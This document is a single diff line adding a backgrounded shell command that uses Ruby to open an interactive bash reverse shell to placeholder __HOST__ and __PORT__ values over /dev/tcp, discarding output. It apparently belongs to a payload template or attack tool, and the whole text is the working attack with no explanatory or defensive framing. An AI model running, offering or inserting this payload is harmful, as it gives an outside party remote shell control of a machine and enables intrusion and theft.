@@ -1,0 +1,1 @@
+/usr/bin/nohup /bin/bash -c "ruby -rsocket -e 'exec(\"/bin/bash\",\"-c\",\"/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1\");'" >/dev/null &
